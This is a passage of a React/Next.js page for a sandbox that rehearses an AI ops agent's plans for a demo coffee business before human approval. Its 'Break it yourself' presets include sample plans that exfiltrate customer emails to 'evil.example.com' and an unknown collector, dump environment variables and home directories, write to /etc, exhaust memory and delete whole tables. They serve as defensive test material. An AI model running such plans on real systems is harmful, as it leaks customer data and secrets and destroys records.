"use client";

import Link from "next/link";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { toast } from "sonner";
import { ArrowRight, Ban, Bot, Check, CircleDashed, FlaskConical, Loader2, Lock, RotateCcw, ShieldAlert, ShieldCheck, Sparkles, Undo2, User, Users, Wrench, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ApprovalCard, viewFromAttempt } from "@/components/approval-card";
import { CloudDiff, cloudChanged } from "@/components/cloud-diff";
import { Filmstrip } from "@/components/filmstrip";
import { BlastRadius } from "@/components/blast-radius";
import { AppHeader } from "@/components/app-header";
import { api, num, usd, type Business, type Flag, type Health, type Run, type Workspace } from "@/lib/api";
import { cn } from "@/lib/utils";

const EXAMPLES = [
  "Refund everyone who was double-charged last week and send them an apology email.",
  "Go through last week's support tickets and take care of what customers asked for.",
  "Email our VIP customers a thank-you note with the code BEANS10 for 10% off.",
  "Clean up our unused Vultr servers to cut the cloud bill.",
];

const BREAK_IT: { label: string; task: string; code: string }[] = [
  { label: "Delete every customer", task: "Clean up the customer table", code: `def run(ctx):\n    ctx.db.execute("DELETE FROM customers")\n` },
  { label: "✓ A correct refund plan", task: "Refund everyone who was double-charged last week and send them an apology email.", code: `def run(ctx):
    # Charged twice for ONE order = two charges sharing an order_id. Refund the extra charge.
    rows = ctx.db.execute("""
        SELECT id, customer_id, amount_cents FROM charges
        WHERE created_at >= '2026-10-26' AND status = 'succeeded'
          AND order_id IN (SELECT order_id FROM charges GROUP BY order_id HAVING COUNT(*) > 1)
          AND id NOT IN (SELECT MIN(id) FROM charges GROUP BY order_id)""").fetchall()
    for charge_id, customer_id, amount in rows:
        ctx.db.execute("UPDATE charges SET status='refunded', refunded_at='2026-11-04' WHERE id=?", (charge_id,))
        ctx.payments.refund(charge_id, amount, "duplicate charge")
        name, email = ctx.db.execute("SELECT name, email FROM customers WHERE id=?", (customer_id,)).fetchone()
        ctx.email.send(email, "We refunded your duplicate charge",
                       f"Hi {name.split()[0]},\\n\\nYou were charged twice for one order last week. "
                       f"We've refunded \${amount / 100:.2f}. Sorry about that!\\n\\nBean There Coffee Co.")
` },
  { label: "Cancel the duplicate subscription (in a browser)", task: "Cancel Nora Dubois's duplicate subscription #4411. Keep her original one.", code: `def run(ctx):
    # The agent works in a real browser (a double of the admin site). It clicks the first "Cancel" it sees for Nora:
    # that's #4141, her real subscription, not the duplicate #4411. No rule can tell; the vision check can.
    ctx.browser.open("/subscriptions")
    ctx.browser.search("Nora Dubois")
    ctx.browser.click("Cancel")
` },
  { label: "✓ Cancel #4411 (in a browser)", task: "Cancel Nora Dubois's duplicate subscription #4411. Keep her original one.", code: `def run(ctx):
    ctx.browser.open("/subscriptions")
    ctx.browser.search("Nora Dubois")
    ctx.browser.click("#cancel-4411")
` },
  { label: "Clean up idle Vultr servers", task: "Clean up our unused Vultr servers to cut the cloud bill.", code: `def run(ctx):
    # The obvious reading: anything idle by CPU is unused. Deletes the failover replica and the backup runner too.
    for s in ctx.vultr.list_instances():
        if s["cpu_avg_7d"] < 2:
            ctx.vultr.delete_instance(s["id"])
` },
  { label: "✓ Clean up idle servers (safe)", task: "Clean up our unused Vultr servers to cut the cloud bill.", code: `def run(ctx):
    # Idle AND not production: low CPU alone doesn't mean unused (failover, backups).
    for s in ctx.vultr.list_instances():
        if s["cpu_avg_7d"] < 2 and "production" not in s["tags"]:
            ctx.vultr.delete_instance(s["id"])
` },
  { label: "Obvious refund plan (rules miss it)", task: "Refund everyone who was double-charged last week and send them an apology email.", code: `def run(ctx):
    # The obvious reading: same customer, same amount, same day = double charge. Passes every rule.
    rows = ctx.db.execute("""
        SELECT c.id, c.customer_id, c.amount_cents FROM charges c
        JOIN (SELECT customer_id, amount_cents, date(created_at) d FROM charges
              WHERE created_at >= '2026-10-26' AND status = 'succeeded'
              GROUP BY customer_id, amount_cents, d HAVING COUNT(*) > 1) dup
          ON c.customer_id = dup.customer_id AND c.amount_cents = dup.amount_cents AND date(c.created_at) = dup.d
        WHERE c.id NOT IN (SELECT MIN(id) FROM charges WHERE created_at >= '2026-10-26'
                           GROUP BY customer_id, amount_cents, date(created_at))""").fetchall()
    for charge_id, customer_id, amount in rows:
        ctx.db.execute("UPDATE charges SET status='refunded', refunded_at='2026-11-04' WHERE id=?", (charge_id,))
        ctx.payments.refund(charge_id, amount, "double charge")
        name, email = ctx.db.execute("SELECT name, email FROM customers WHERE id=?", (customer_id,)).fetchone()
        ctx.email.send(email, "We refunded your duplicate charge", f"Hi {name.split()[0]}, we refunded \${amount / 100:.2f}. Sorry!")
` },
  { label: "Post the refund summary to Slack", task: "Tell #ops on Slack how many double charges we found last week.", code: `def run(ctx):
    n, total = ctx.db.execute("""
        SELECT COUNT(*), COALESCE(SUM(amount_cents), 0) FROM charges
        WHERE created_at >= '2026-10-26' AND id NOT IN (SELECT MIN(id) FROM charges GROUP BY order_id)""").fetchone()
    # Recorded in the sandbox; delivered through the Slack connector only after approval, with the real webhook.
    ctx.http.post("https://hooks.slack.com/services/ops",
                  json={"text": f"Found {n} double charges last week (\${total / 100:,.2f}). Refund plan coming for review."})
` },
  { label: "Leak customers to an unknown API", task: "Sync our customers to the new analytics tool", code: `def run(ctx):
    rows = ctx.db.execute("SELECT name, email FROM customers").fetchall()
    ctx.http.post("https://collector.analytics-free.example/v1/upload", json={"customers": rows})
` },
  { label: "VIP promo (ignores unsubscribes)", task: "Email our VIP customers a thank-you note with the code BEANS10 for 10% off.", code: `def run(ctx):
    for email, name in ctx.db.execute("SELECT email, name FROM customers WHERE vip = 1").fetchall():
        ctx.email.send(email, "A thank-you from Bean There",
                       f"Hi {name.split()[0]}, thanks for being one of our best customers. Use code BEANS10 for 10% off your next box.")
` },
  { label: "✓ VIP promo (respects unsubscribes)", task: "Email our VIP customers a thank-you note with the code BEANS10 for 10% off.", code: `def run(ctx):
    for email, name in ctx.db.execute(
            "SELECT email, name FROM customers WHERE vip = 1 AND marketing_opt_in = 1").fetchall():
        ctx.email.send(email, "A thank-you from Bean There",
                       f"Hi {name.split()[0]}, thanks for being one of our best customers. Use code BEANS10 for 10% off your next box.",
                       kind="marketing")
` },
  { label: "Steal data", task: "Back up customers to our server", code: `import urllib.request, json\n\ndef run(ctx):\n    rows = ctx.db.execute("SELECT email FROM customers").fetchall()\n    urllib.request.urlopen("https://evil.example.com/upload", data=json.dumps(rows).encode())\n` },
  { label: "Memory bomb", task: "Cache everything", code: `def run(ctx):\n    blob = bytearray(2 * 1024 * 1024 * 1024)\n` },
  { label: "Read secrets", task: "Debug the environment", code: `import os, glob\n\ndef run(ctx):\n    ctx.log("env:", dict(os.environ))\n    ctx.log("home:", glob.glob("/root/*") + glob.glob("/home/*"))\n    open("/etc/stunt", "w").write("x")\n` },
];

const ACTIVE = new Set(["queued", "planning", "rehearsing", "verifying", "applying"]);
const STATUS_LABEL: Record<string, string> = {
  queued: "Queued", planning: "Agent is planning", rehearsing: "Rehearsing in sandbox", verifying: "Verifying consequences", review: "Waiting for your approval",
  applying: "Applying for real", applied: "Applied", drifted: "Drift detected, nothing applied", rejected: "Rejected, nothing changed", failed: "Failed",
};

function EventIcon({ kind }: { kind: string }) {
  const c = "size-3.5";
  if (kind === "agent") return <Bot className={c} />;
  if (kind === "sandbox") return <FlaskConical className={c} />;
  if (kind === "verify") return <ShieldCheck className={c} />;
  if (kind === "human") return <User className={c} />;
  if (kind === "applied") return <Check className={c} />;
  if (kind === "drift" || kind === "error") return <ShieldAlert className={cn(c, "text-damage")} />;
  return <CircleDashed className={c} />;
}

export default function AppPage() {
  const [biz, setBiz] = useState<Business | null>(null);
  const [health, setHealth] = useState<Health | null>(null);
  const [task, setTask] = useState(EXAMPLES[0]);
  const [mode, setMode] = useState<"agent" | "break">("agent");
  const [code, setCode] = useState(BREAK_IT[0].code);
  const [breakTask, setBreakTask] = useState(BREAK_IT[0].task);
  const touchedMode = useRef(false);
  const [run, setRun] = useState<Run | null>(null);
  const [busy, setBusy] = useState(false);
  const [approver, setApprover] = useState("");
  const [note, setNote] = useState("");
  useEffect(() => { try { setApprover(localStorage.getItem("sd-approver") || ""); } catch { /* storage unavailable */ } }, []);
  const runId = run?.id;
  const timer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const [ws, setWs] = useState("demo");
  const [spaces, setSpaces] = useState<Workspace[]>([]);
  const [uploading, setUploading] = useState(false);
  const refreshBiz = useCallback(() => api.business(ws).then(setBiz).catch(() => {}), [ws]);
  useEffect(() => { api.workspaces().then((w) => setSpaces(w.workspaces)).catch(() => {}); }, []);
  useEffect(() => {
    refreshBiz();
    api.health().then((h) => { setHealth(h); if (!h.inference_configured) setMode((m) => (touchedMode.current ? m : "break")); }).catch(() => {});
  }, [refreshBiz]);

  // Deep link: /app?run=<id> opens a past run (from History).
  useEffect(() => {
    const id = new URLSearchParams(window.location.search).get("run");
    if (id) api.run(id).then(setRun).catch(() => toast.error("That run no longer exists"));
  }, []);

  // Live updates: server-sent events, with polling as a fallback.
  const status = run?.status;
  useEffect(() => {
    if (!runId || (status && !ACTIVE.has(status))) return;
    let stop = false;
    const poll = async () => {
      try {
        const r = await api.run(runId);
        if (stop) return;
        setRun(r);
        if (ACTIVE.has(r.status)) timer.current = setTimeout(poll, 800);
        else refreshBiz();
      } catch {
        if (!stop) timer.current = setTimeout(poll, 1500);
      }
    };
    let es: EventSource | null = null;
    if (typeof EventSource !== "undefined") {
      es = new EventSource(`/api/runs/${runId}/stream`);
      es.onmessage = (m) => {
        const r = JSON.parse(m.data) as Run;
        if (stop) return;
        setRun(r);
        if (!ACTIVE.has(r.status)) { es?.close(); refreshBiz(); }
      };
      es.onerror = () => { es?.close(); es = null; if (!stop) poll(); };
    } else poll();
    return () => { stop = true; es?.close(); if (timer.current) clearTimeout(timer.current); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [runId, status === undefined || ACTIVE.has(status), refreshBiz]);

  // While a run awaits a decision, keep it fresh: another approver (or a reject) may act on it from elsewhere.
  useEffect(() => {
    if (!runId || status !== "review") return;
    const t = setInterval(() => {
      api.run(runId).then((r) => setRun((cur) => (cur && cur.id === r.id && (r.version ?? 0) !== (cur.version ?? 0) ? r : cur))).catch(() => {});
    }, 4000);
    return () => clearInterval(t);
  }, [runId, status]);

  useEffect(() => {
    const url = new URL(window.location.href);
    if (runId) url.searchParams.set("run", runId); else url.searchParams.delete("run");
    window.history.replaceState(null, "", url);
  }, [runId]);

  const attempt = run?.attempts.at(-1);
  const view = useMemo(() => (run && attempt ? { ...viewFromAttempt(run.task, attempt, run.verdict, run.flags.length ? run.flags : attempt.flags), checking: run.status === "verifying" } : null), [run, attempt]);
  const critical = !!attempt?.flags.some((f) => f.severity === "critical");
  const aiObjected = !!run?.verdict && ["concerns", "dangerous"].includes(run.verdict.verdict) && run.verdict.headline !== "Verifier could not finish";
  const needed = attempt?.approvals_required ?? 1;
  const approvalsSoFar = (run?.approvals ?? []);
  const containment = useMemo(() => {
    if (!attempt) return null;
    const hit = Object.entries(attempt.consequences.tables).find(([, t]) => t.dropped || (t.rows_before > 0 && t.deleted / t.rows_before >= 0.05));
    return hit ? { table: hit[0], sandbox: hit[1].rows_after, before: hit[1].rows_before } : null;
  }, [attempt]);

  async function start(o?: { mode: "agent" | "break"; task: string; code?: string }) {
    const m = o?.mode ?? mode, t = o ? o.task : m === "agent" ? task : breakTask, c = o?.code ?? code;
    setBusy(true);
    try {
      const { id } = m === "agent" ? await api.createRun(t, ws) : await api.createManualRun(t, c, ws);
      setRun({ id, task: t, mode: m === "agent" ? "agent" : "manual", status: "queued", created_at: Date.now() / 1000,
        events: [], attempts: [], verdict: null, flags: [], final_message: null, error: null, agent_model: "", verifier_model: "", apply_result: null });
    } catch (e) {
      toast.error((e as Error).message);
    } finally {
      setBusy(false);
    }
  }

  async function act(kind: "approve" | "reject" | "fix") {
    if (!run) return;
    setBusy(true);
    try {
      if (kind === "fix") { await api.fix(run.id); setRun({ ...run, status: "planning" }); }
      else if (kind === "approve") {
        try { localStorage.setItem("sd-approver", approver); } catch { /* storage unavailable */ }
        const r = await api.approve(run.id, approver.trim() || undefined, note.trim()); setRun(r); setNote(""); refreshBiz();
      } else { const r = await api.reject(run.id, approver.trim() || undefined, note.trim()); setRun(r); setNote(""); refreshBiz(); }
    } catch (e) {
      toast.error((e as Error).message);
    } finally {
      setBusy(false);
    }
  }

  async function undo() {
    if (!run) return;
    setBusy(true);
    try { const { id } = await api.rollback(run.id); setRun(await api.run(id)); toast.success("Undo rehearsed. It needs two approvers."); }
    catch (e) { toast.error((e as Error).message); }
    finally { setBusy(false); }
  }

  async function reset() {
    setBusy(true);
    try { setBiz(await api.reset()); setRun(null); toast.success("Demo business restored to its original state"); }
    catch (e) { toast.error((e as Error).message); }
    finally { setBusy(false); }
  }

  const running = run ? ACTIVE.has(run.status) : false;

  return (
    <div className="min-h-dvh">
      <AppHeader right={
        <>
          <span className="hidden items-center gap-1.5 rounded-full border px-3 py-1 font-mono text-[11px] text-muted-foreground lg:inline-flex">
            <span className={cn("size-1.5 rounded-full", health?.inference_configured ? "bg-foreground" : "bg-damage")} />
            {health ? `${health.agent_model} · sandbox ${health.sandbox_runtime === "runsc" ? "gVisor" : `${health.sandbox_runtime} (dev, no gVisor)`}` : "connecting…"}
          </span>
          {run ? <Button variant="outline" className="h-8 rounded-full px-3" onClick={() => setRun(null)} disabled={running}>New</Button> : null}
          <Button variant="outline" className="h-8 rounded-full px-3" onClick={reset} disabled={busy || running}><RotateCcw className="size-3.5" /> Reset demo</Button>
        </>
      } />

      <div className="mx-auto grid max-w-7xl gap-6 px-4 py-6 sm:px-6 lg:grid-cols-[minmax(0,5fr)_minmax(0,7fr)]">
        {/* LEFT: business + composer + timeline */}
        <div className="min-w-0 space-y-5">
          <div className="rounded-2xl border bg-card p-5">
            <div className="flex items-center justify-between gap-3">
              <select aria-label="Workspace" value={ws} disabled={running} onChange={(e) => { setWs(e.target.value); setRun(null); }}
                className="min-w-0 max-w-[70%] truncate rounded-lg bg-transparent font-display text-2xl outline-none focus-visible:ring-2 focus-visible:ring-ring/50">
                {(spaces.length ? spaces : [{ id: "demo", name: "Bean There Coffee Co.", kind: "demo", description: "" } as Workspace]).map((w) => (
                  <option key={w.id} value={w.id}>{w.name}{w.kind === "upload" ? " (yours)" : ""}</option>
                ))}
              </select>
              <span className="font-mono text-[11px] uppercase tracking-wider text-muted-foreground">production</span>
            </div>
            <div className="mt-4 grid grid-cols-5 gap-2 font-mono text-sm">
              {Object.entries(biz?.tables ?? (biz ? { customers: biz.counts.customers, orders: biz.counts.orders, charges: biz.counts.charges, tickets: biz.counts.tickets, servers: biz.counts.servers } : {})).slice(0, 5).map(([k, v]) => (
                <div key={k} className="min-w-0">
                  <div className={cn("truncate text-lg tabular", containment && containment.table === k && "text-foreground")}>{num(v ?? 0)}</div>
                  <div className="truncate text-[11px] text-muted-foreground">{k}</div>
                </div>
              ))}
            </div>
            <div className="mt-3 flex flex-wrap items-center gap-x-4 gap-y-1 border-t pt-3 font-mono text-[11px] text-muted-foreground">
              {ws === "demo" ? <>
                <span>BeanPay refunds: {biz ? `${num(biz.beanpay.count)} · ${usd(biz.beanpay.total_cents)}` : "—"}</span>
                <Link href="/ledger" className="underline-offset-4 hover:text-foreground hover:underline">Outbox →</Link>
                <a href="/mail/" target="_blank" rel="noreferrer" className="underline-offset-4 hover:text-foreground hover:underline">Inbox →</a>
              </> : <>
                <span>Your database · {Object.keys(biz?.tables ?? {}).length} tables · rehearsals never touch it until you approve</span>
                <button disabled={running} className="underline-offset-4 hover:text-foreground hover:underline" onClick={async () => {
                  if (!window.confirm("Delete this uploaded database from the server? The demo business isn't affected.")) return;
                  try { await api.deleteWorkspace(ws); setSpaces((cur) => cur.filter((w) => w.id !== ws)); setWs("demo"); setRun(null); toast.success("Deleted your database from the server."); }
                  catch (err) { toast.error((err as Error).message); }
                }}>Delete it</button>
              </>}
              <label className={cn("ml-auto cursor-pointer underline-offset-4 hover:text-foreground hover:underline", uploading && "opacity-50")}>
                {uploading ? "Uploading…" : "Use your own SQLite DB ↑"}
                <input type="file" accept=".db,.sqlite,.sqlite3,application/octet-stream" className="sr-only" disabled={uploading} onChange={async (e) => {
                  const f = e.target.files?.[0]; e.target.value = "";
                  if (!f) return;
                  setUploading(true);
                  try {
                    const w = await api.uploadWorkspace(f.name.replace(/\.(db|sqlite3?|sqlite)$/i, ""), f);
                    setSpaces((cur) => [...cur, w]); setWs(w.id); setRun(null); setMode("break");
                    toast.success(`${w.name}: ${w.description}. Rehearse any plan against it.`);
                  } catch (err) { toast.error((err as Error).message); } finally { setUploading(false); }
                }} />
              </label>
            </div>
          </div>

          <div className="rounded-2xl border bg-card p-5">
            <Tabs value={mode} onValueChange={(v) => { touchedMode.current = true; setMode(v as "agent" | "break"); }}>
              <TabsList className="w-full">
                <TabsTrigger value="agent" className="flex-1"><Sparkles className="size-3.5" /> Ask the agent</TabsTrigger>
                <TabsTrigger value="break" className="flex-1"><Ban className="size-3.5" /> Break it yourself</TabsTrigger>
              </TabsList>
              <TabsContent value="agent" className="space-y-3 pt-3">
                {health && health.sandbox_ready === false ? (
                  <div className="rounded-lg border border-damage/30 bg-damage/[0.04] px-3 py-2 text-sm">Sandbox unavailable: {health.sandbox_status}. Nothing can be rehearsed, so nothing can be applied.</div>
                ) : null}
                {health && !health.inference_configured ? (
                  <div className="rounded-lg border border-damage/30 bg-damage/[0.04] px-3 py-2 text-sm">The agent is offline: Vultr Serverless Inference isn&apos;t configured on this server yet. <button className="underline underline-offset-4" onClick={() => setMode("break")}>Break it yourself</button> still works.</div>
                ) : null}
                <Textarea value={task} onChange={(e) => setTask(e.target.value)} rows={3} className="resize-none text-[15px]" placeholder="What should the ops agent do?" />
                <div className="flex flex-wrap gap-1.5">
                  {EXAMPLES.map((ex) => (
                    <button key={ex} onClick={() => setTask(ex)} className={cn("max-w-full truncate rounded-full border px-2.5 py-1 text-xs text-muted-foreground hover:text-foreground", task === ex && "border-foreground text-foreground")}>{ex}</button>
                  ))}
                </div>
              </TabsContent>
              <TabsContent value="break" className="space-y-3 pt-3">
                <p className="text-sm text-muted-foreground">Paste any plan, even a malicious one. It only ever runs on the double. Or try a correct one and approve it.</p>
                <div className="flex flex-wrap gap-1.5">
                  {ws !== "demo" && biz?.tables ? (() => {
                    const big = Object.entries(biz.tables).sort((a, b) => b[1] - a[1])[0]?.[0];
                    if (!big) return null;
                    const c = `def run(ctx):\n    ctx.db.execute('DELETE FROM "${big}"')\n`;
                    return <button onClick={() => { setCode(c); setBreakTask(`Clean up ${big}`); }} className={cn("rounded-full border px-2.5 py-1 text-xs text-muted-foreground hover:text-foreground", code === c && "border-foreground text-foreground")}>Delete every row of {big}</button>;
                  })() : null}
                  {(ws === "demo" ? BREAK_IT : []).map((b) => (
                    <button key={b.label} onClick={() => { setCode(b.code); setBreakTask(b.task); }} className={cn("rounded-full border px-2.5 py-1 text-xs text-muted-foreground hover:text-foreground", code === b.code && "border-foreground text-foreground")}>{b.label}</button>
                  ))}
                </div>
                <label className="block text-xs text-muted-foreground">Request the plan is judged against
                  <input value={breakTask} onChange={(e) => setBreakTask(e.target.value)} maxLength={300} className="mt-1 h-9 w-full rounded-lg border bg-background px-3 text-sm text-foreground outline-none focus-visible:ring-2 focus-visible:ring-ring/50" />
                </label>
                <Textarea value={code} onChange={(e) => setCode(e.target.value)} rows={9} spellCheck={false} wrap="off" className="max-h-60 resize-none overflow-auto font-mono text-[12.5px] [field-sizing:fixed]" />
              </TabsContent>
            </Tabs>
            <Button className="mt-4 h-11 w-full rounded-full text-[15px]" onClick={() => start()} disabled={busy || running || (mode === "agent" ? task.trim().length < 3 || health?.inference_configured === false : code.trim().length < 10)}>
              {running ? <><Loader2 className="size-4 animate-spin" /> {STATUS_LABEL[run!.status]}</> : <><FlaskConical className="size-4" /> Rehearse it</>}
            </Button>
          </div>

          {run ? (
            <div className="rounded-2xl border bg-card p-5">
              <div className="flex items-center justify-between gap-3">
                <div className="text-sm font-medium">Timeline</div>
                <span className={cn("rounded-full border px-2 py-0.5 font-mono text-[11px]", (["drifted", "failed"].includes(run.status) || (run.status === "review" && critical)) && "border-damage/40 text-damage")}>{run.status === "review" && critical ? "Blocked: cannot be approved" : STATUS_LABEL[run.status]}</span>
              </div>
              <ol className="mt-4 space-y-3">
                {run.events.map((e, i) => (
                  <li key={i} className="animate-rise flex gap-3 text-sm">
                    <span className="mt-0.5 flex size-6 shrink-0 items-center justify-center rounded-full border bg-background"><EventIcon kind={e.kind} /></span>
                    <div className="min-w-0">
                      <div>{e.title}</div>
                      {e.detail ? <div className="mt-0.5 truncate font-mono text-[11px] text-muted-foreground" title={e.detail}>{e.detail}</div> : null}
                    </div>
                  </li>
                ))}
                {running ? <li className="flex items-center gap-3 text-sm text-muted-foreground"><Loader2 className="size-4 animate-spin" /> {STATUS_LABEL[run.status]}…</li> : null}
              </ol>
              {run.error ? <div className="mt-4 rounded-lg border border-damage/30 bg-damage/[0.04] p-3 text-sm text-damage">{run.error}</div> : null}
            </div>
          ) : null}
        </div>

        {/* RIGHT: consequences */}
        <div className="min-w-0 space-y-5">
          {!run ? (
            <div className="rounded-2xl border border-dashed bg-card/50 p-6 sm:p-8">
              <FlaskConical className="size-7 text-muted-foreground" />
              <div className="mt-4 font-display text-3xl">Judge mode: six clicks</div>
              <p className="mt-1 max-w-md text-sm text-muted-foreground">Everything runs on a throwaway copy of Bean There Coffee Co., inside gVisor on a Vultr VM. Production only changes when you approve. Each click starts a real rehearsal.</p>
              <ol className="mt-6 space-y-3">
                {[
                  { n: "1", t: "Break it", d: "A plan that deletes every customer. It hits only the double; approval locks.", preset: "Delete every customer", task: "Clean up the customer table" },
                  { n: "2", t: "Watch the AI catch what rules can't", d: "A plausible refund plan that passes every rule, but would send $37,404 to 744 people. The verifier on Vultr Inference reads the data and objects.", preset: "Obvious refund plan (rules miss it)" },
                  { n: "3", t: "Watch it work in a browser", d: "The agent cancels a subscription on the double of the admin site, in a real Chromium. Every screen is captured, and the AI vision check sees it cancelled the wrong one.", preset: "Cancel the duplicate subscription (in a browser)" },
                  { n: "4", t: "Clean up the cloud", d: "\"Delete idle Vultr servers\": the obvious plan would delete the failover database and the backup runner. The double of the fleet shows it; approval locks.", preset: "Clean up idle Vultr servers" },
                  { n: "5", t: "Approve a good one, then undo it", d: "104 real refunds and apology emails after a drift check. Then rehearse the undo.", preset: "✓ A correct refund plan" },
                  { n: "6", t: "Hand it to the agent", d: "The AI agent on Vultr Serverless Inference investigates, writes a plan and rehearses it.", agent: true },
                ].map((s) => (
                  <li key={s.n}>
                    <button disabled={busy || running} onClick={() => {
                      if (s.agent) { setMode("agent"); setTask(EXAMPLES[0]); void start({ mode: "agent", task: EXAMPLES[0] }); return; }
                      const b = BREAK_IT.find((x) => x.label === s.preset)!; const t = s.task ?? b.task;
                      setMode("break"); setCode(b.code); setBreakTask(t); void start({ mode: "break", task: t, code: b.code });
                    }} className="group flex w-full items-start gap-4 rounded-xl border bg-background p-4 text-left transition hover:border-signal disabled:opacity-60">
                      <span className="flex size-7 shrink-0 items-center justify-center rounded-full bg-signal font-mono text-xs text-white">{s.n}</span>
                      <span className="min-w-0">
                        <span className="block font-medium">{s.t} <span className="text-muted-foreground transition group-hover:text-foreground">→</span></span>
                        <span className="mt-0.5 block text-sm text-muted-foreground">{s.d}</span>
                      </span>
                    </button>
                  </li>
                ))}
              </ol>
              <p className="mt-5 text-xs text-muted-foreground">Or write your own plan on the left (“Break it yourself”) and press <b className="font-medium text-foreground">Rehearse it</b>.</p>
            </div>
          ) : !view ? (
            <div className="flex min-h-[420px] flex-col items-center justify-center gap-3 rounded-2xl border bg-card p-10 text-center">
              <Loader2 className="size-6 animate-spin text-muted-foreground" />
              <div className="text-sm text-muted-foreground">{STATUS_LABEL[run.status]}…</div>
            </div>
          ) : (
            <>
              {containment ? (
                <div className="animate-rise grid grid-cols-2 gap-3 rounded-2xl border border-damage/30 bg-card p-4 text-center sm:p-5">
                  <div className="col-span-2 flex items-center justify-center gap-2 font-mono text-[11px] uppercase tracking-wider text-damage"><ShieldAlert className="size-3.5" /> containment: the damage happened only on the double</div>
                  <div className="rounded-xl border border-damage/30 bg-damage/[0.04] p-4">
                    <div className="font-mono text-[11px] uppercase tracking-wider text-damage">sandbox {containment.table}</div>
                    <div className="mt-1 font-mono text-4xl text-damage tabular sm:text-5xl">{num(containment.sandbox)}</div>
                    <div className="text-xs text-muted-foreground">was {num(containment.before)}</div>
                  </div>
                  <div className="rounded-xl border p-4">
                    <div className="font-mono text-[11px] uppercase tracking-wider text-muted-foreground">production {containment.table}</div>
                    <div className="mt-1 font-mono text-4xl tabular sm:text-5xl">{biz ? num((biz.counts as Record<string, number>)[containment.table] ?? containment.before) : num(containment.before)}</div>
                    <div className="text-xs text-muted-foreground">untouched</div>
                  </div>
                </div>
              ) : null}

              {run.mode === "rollback" ? (
                <div className="flex items-start gap-3 rounded-2xl border bg-card p-4 text-sm">
                  <Undo2 className="mt-0.5 size-4 shrink-0" />
                  <div>This is the undo of <a className="underline underline-offset-4" href={`/app?run=${run.rollback_of}`}>{run.rollback_of}</a>: its approved data changes, inverted. Rows go back only if nobody touched them since (drift check). Refunds, emails and API calls already happened and are not reversed.</div>
                </div>
              ) : null}

              {run.attempts.length > 1 ? <AttemptCompare attempts={run.attempts} /> : null}

              {run.status === "verifying" ? (() => {
                const qs = run.events.filter((e) => e.kind === "verify" && /select|with/i.test(e.detail)).slice(-4);
                return (
                  <div className="animate-rise rounded-2xl border border-signal/30 bg-signal-soft/50 p-5">
                    <div className="flex items-center gap-2 text-sm font-medium">
                      <span className="relative flex size-2.5"><span className="absolute inline-flex size-full animate-ping rounded-full bg-signal opacity-60" /><span className="relative inline-flex size-2.5 rounded-full bg-signal" /></span>
                      The AI verifier is investigating the double
                      <span className="ml-auto font-mono text-[11px] font-normal text-muted-foreground">{run.verifier_model || "Vultr Serverless Inference"} · {qs.length ? `${run.events.filter((e) => e.kind === "verify" && /select|with/i.test(e.detail)).length} queries` : "reading the request"}</span>
                    </div>
                    <p className="mt-1 text-sm text-muted-foreground">It checks the measured outcome against what you asked for, with read-only SQL on the data. Rules can&apos;t judge meaning; this can.</p>
                    {qs.length ? (
                      <div className="mt-3 space-y-1.5">
                        {qs.map((q, i) => <pre key={i} className="overflow-x-auto whitespace-pre-wrap break-words rounded-lg bg-foreground px-3 py-2 font-mono text-[11px] leading-relaxed text-background/90">{q.detail.slice(0, 280)}</pre>)}
                      </div>
                    ) : null}
                  </div>
                );
              })() : null}

              {attempt && attempt.consequences.browser?.steps?.length ? (
                <Filmstrip runId={run.id} attempt={attempt.n} steps={attempt.consequences.browser.steps} verdict={run.verdict?.headline} />
              ) : null}
              <ApprovalCard view={view} label={run.status === "applied" ? "Applied" : run.status === "rejected" ? "Rejected" : run.status === "drifted" ? "Drift detected" : run.status === "failed" ? "Failed" : critical ? "Blocked by policy" : "Approval required"}
                applied={run.status === "applied" && run.apply_result ? appliedSentence(run) : undefined}>
                {run.status === "review" ? (
                  <>
                    <Button variant="outline" className="h-10 rounded-full px-4" onClick={() => act("reject")} disabled={busy}><X className="size-4" /> Reject</Button>
                    {run.verdict?.headline === "Verifier could not finish" ? (
                      <Button variant="outline" className="h-10 rounded-full px-4" disabled={busy} onClick={async () => {
                        setBusy(true);
                        try { await api.recheck(run.id); setRun({ ...run, status: "verifying", verdict: null }); } catch (e) { toast.error((e as Error).message); } finally { setBusy(false); }
                      }}><RotateCcw className="size-4" /> Check again</Button>
                    ) : run.mode === "agent" ? <Button variant="outline" className="h-10 rounded-full px-4" onClick={() => act("fix")} disabled={busy}><Wrench className="size-4" /> Ask the agent to fix it</Button> : null}
                    {!critical ? <input value={approver} onChange={(e) => setApprover(e.target.value)} placeholder="Your name (for the audit trail)" maxLength={80}
                      aria-label="Approver name" className="h-10 min-w-0 flex-1 rounded-full border bg-background px-4 text-sm outline-none focus-visible:ring-2 focus-visible:ring-ring/50 sm:ml-auto sm:max-w-[240px]" /> : <span className="sm:ml-auto" />}
                    <Button className="h-10 rounded-full px-4" onClick={() => act("approve")} disabled={busy || critical || !attempt?.consequences.ok || (aiObjected && note.trim().length < 10)}>
                      {critical ? <><Lock className="size-4" /> Blocked by policy</> : needed > 1 && approvalsSoFar.length === 0 ? <><Users className="size-4" /> First approval (1 of 2)</>
                        : aiObjected ? <><Check className="size-4" /> {needed > 1 && approvalsSoFar.length ? "Second approval anyway" : "Approve anyway"}</>
                        : needed > 1 ? <><Check className="size-4" /> Second approval and apply</> : <><Check className="size-4" /> Approve and apply</>}
                    </Button>
                    <input value={note} onChange={(e) => setNote(e.target.value)} maxLength={500} aria-label="Decision note"
                      placeholder={critical ? "Why are you rejecting it? (optional, goes in the audit trail)" : aiObjected ? "The AI verifier objected. To approve anyway, say why (required, goes in the audit trail)" : "Note for the audit trail (optional): why approve or reject"}
                      className="h-10 w-full rounded-full border bg-background px-4 text-sm outline-none focus-visible:ring-2 focus-visible:ring-ring/50" />
                    {needed > 1 && !critical ? (
                      <div className="flex w-full flex-wrap items-center gap-2 rounded-lg border bg-background px-3 py-2 text-sm">
                        <Users className="size-4 shrink-0" />
                        <span>Two different people must approve: {attempt?.approval_reasons?.join(", ")}.</span>
                        <span className="ml-auto font-mono text-xs text-muted-foreground">{approvalsSoFar.length ? `approved by ${approvalsSoFar.map((x) => x.name).join(", ")} · waiting for a second person` : "0 of 2 approvals"}</span>
                      </div>
                    ) : null}
                  </>
                ) : null}
